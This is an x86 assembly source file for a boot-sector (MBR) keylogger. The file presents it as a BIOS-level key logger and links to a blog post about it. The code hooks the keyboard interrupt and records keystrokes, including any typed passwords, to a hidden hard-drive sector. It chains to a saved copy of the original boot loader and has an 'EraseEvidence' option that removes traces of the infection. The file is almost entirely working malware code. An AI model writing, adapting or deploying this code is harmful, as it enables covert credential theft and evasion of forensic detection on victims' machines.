;This is a boot loader keylogger (does not work once Windows XP loads)
;See https://www.castledragmire.com/Posts/BIOS_Level_Key_Logger for more information
;This file is best viewed with a tab size of 4

ORG 0x7C00 ;Origin location

;Constants
Start:					;Where the program starts (0x7C00)
SectorSize equ 0x200	;Size of a sector (and the boot loader)

;User defined constants
	;Memory mappings
	NewStart equ Start+SectorSize			;Where the boot loader will be copied to in memory for execution
	WhereToRecord equ Start+SectorSize*2 	;Where to record key strokes in memory (the save buffer)

	;Hard drive mappings
	WriteSector equ 60				;The hard drive sector to write the last logged 512 keys too. Needs to be <63. This can be the same as "OriginalBootLoaderSector" if "EraseEvidence" is true
	OriginalBootLoaderSector equ 61	;The hard drive sector the original boot loader is written to
	EraseEvidence equ 0				;Boolean dictating whether to restore the original boot loader and clear out where it was copied

;More constants
CodeOffset equ NewStart-Start		;The code is actually offset this amount when copied to the new memory location

;Set up needed segment registers to point to 0
xor ax,ax
mov ds,ax
mov es,ax

;Copy this loaded boot loader to new location in memory and execute there
mov cx,SectorSize
mov si,Start
mov di,NewStart
rep movsb
db 0xe9								;Jump to...
dw CodeOffset						;...Location where code is moved to

;Copy the original boot loader from the hard drive back to the boot address in memory
mov ah,2							;Read instruction
mov dl,0x80							;Drive #0 (0x80-x)
mov al,1							;1 sector
xor dh,dh							;Head #0
xor ch,ch							;Track #0
mov cl,OriginalBootLoaderSector+1	;Sector to read from
mov bx,Start						;Memory location to write to
int 0x13							;BIOS drive function

;Zero out the save buffer
mov cx,SectorSize
mov di,WhereToRecord
xor al,al
rep stosb

;Erase this boot loader if requested by returning the hard drive's boot loader to its original state and clearing out its copy at OriginalBootLoaderSector
or al,EraseEvidence					;Check to see if user wants to erase the evidence (al=0 before this operation)
jz SkipEraseEvidence				;If false, do not do so
mov bx,Start						;The buffer to write (which is now the original boot loader)
mov cl,0+1							;Write to the first sector
call WriteToDrive					;Do the write to restore the original boot loader
mov bx,WhereToRecord				;The save buffer, which is zeroed out
mov cl,OriginalBootLoaderSector+1	;Write to where the original boot loader was stored
call WriteToDrive					;Do the write to erase the backup of the original boot loader
SkipEraseEvidence:

;Hook the keyboard interrupt
cli												;Disable interrupts
mov eax, [es:0x9*4]								;Grab the origial handler. Source=IDT::INT9. From Wikipedia: The IDT [Interrupt descriptor (Vector) table] "resides at a fixed location in memory from address 0x0000 to 0x03ff, and consists of 256 four-byte real mode pointers"
mov [es:OriginalInt9Handler+CodeOffset], eax	;And save it for later use
mov dword [es:0x9*4], Int9Hook+CodeOffset		;Install INT 9 filter
sti												;Enable interrupts

;An infinite test loop that will output typed characters to the screen, and never go to the original boot loader
;GetKeys:
;mov ah,0
;int 0x16
;mov ah,0xe ;Write ascii character to screen
;int 0x10
;cmp al,0xA
;jne GetKeys

;Execute the original boot loader
db 0xe9									;Jump to...
dw -CodeOffset-($-Start)-2				;...Original start, which now contains the original boot loader

;Keyboard hook
Int9Hook:
	pushf								;Since the original int handler will call iret, we need to push an extra layer of interrupt info on the stack
	DB 9Ah								;CALL FAR PROC SEGMENT:OFFSET
		OriginalInt9Handler dd 0		;The original Interrupt 9 handler (in segment:offset format [ror 16])

	;Save registers and zero out es
	pusha
	xor bx,bx
	mov es,bx

	;Get the character we are currently on in the save buffer, and if >512, do not record
	mov di,[es:CharacterOn+CodeOffset]	;di=The character we are currently on
	cmp di,512
	jge SkipInt9

	;Loop through the keyboard buffer
	mov esi,[es:0x41A]					;40:1A=Offset from 40:00 to keyboard buffer head, 40:1C=Offset from 40:00 to keyboard buffer tail
	add esi,0x04000400					;Beginning and end +=0x400, si=keyboard buffer head
	mov ecx,esi
	shr ecx,16							;cx=keyboard buffer tail
	mov bx,0x41E						;bx=The beginning of the keyboard buffer
	cmp si,cx							;Check if there are no characters to write (head==tail)
	je SkipInt9							;If there are no keys to write, jump to end
	WriteKey:							;Save a single keyboard character to our save buffer.
		;Save the character
		mov al,[es:si]					;Fetch the character, use es:si+1 to save the scancode instead
		mov [es:di+WhereToRecord],al	;Save the character
		;Update where we are in the save buffer and make sure we are not at the end (>512)
		inc di							;Update where we are in the buffer
		cmp di,512
		jge FinishedKeyboardBuffer

		;Move to the next character in the keyboard buffer and if we are not at the end, write the next character
		add si,2						;Move to the next character in the keyboard buffer
		cmp si,0x43E					;If we have exceeded the keyboad buffer length...
		cmovge si,bx					;...loop back to the beginning
		cmp si,cx						;If there are still more characters to write (head<tail)
		jl WriteKey						;Write the next character
	FinishedKeyboardBuffer:

	mov [es:CharacterOn+CodeOffset],di	;Update where we are in the save buffer

	;Write the updated keylogger to the harddrive
	mov cl,WriteSector+1				;Sector to write to
	mov bx,WhereToRecord
	call WriteToDrive

	;Clean up from the interrupt
	SkipInt9:
	popa
	iret

;Write to drive function. Parameters: es:bx=Buffer, cl:Sector to write
WriteToDrive:
mov ah,3			;Write instruction
mov dl,0x80			;Drive #0 (0x80-x)
mov al,1			;1 sector
xor dh,dh			;Head #0
xor ch,ch			;Track #0
int 0x13			;BIOS drive function
ret					;Return from function

;Variables
CharacterOn dw 0	;What character we are on in the character buffer

;Fill out up to 0x1BE, where the partition information starts, with 0s. This cleans up unused information
times 0x1BE-($-$$) db 0 ;Fill the rest with zeros

;;Output the hex for a DWORD: Receives edx
;OutputHexDWORD:
;	pusha				;Save general purpose registers
;	rol edx,8			;Display bytes in reverse order
;	call OutputHexChar
;	rol edx,8
;	call OutputHexChar
;	rol edx,8
;	call OutputHexChar
;	rol edx,8
;	call OutputHexChar
;	popa				;Restore general purpose registers
;	ret
;
;;Output the hex of a single byte: destroys ax,bx,cx; receives dl
;OutputHexChar:
;	mov ah,0xe
;	mov cx,'A'-10
;	;Char1
;	mov al,dl
;	shr al,4
;	mov bx,'0'
;	cmp al,10
;	cmovge bx,cx
;	add al,bl
;	int 0x10
;	;Char2
;	mov al,dl
;	and al,0xF
;	mov bx,'0'
;	cmp al,10
;	cmovge bx,cx
;	add al,bl
;	int 0x10
;	ret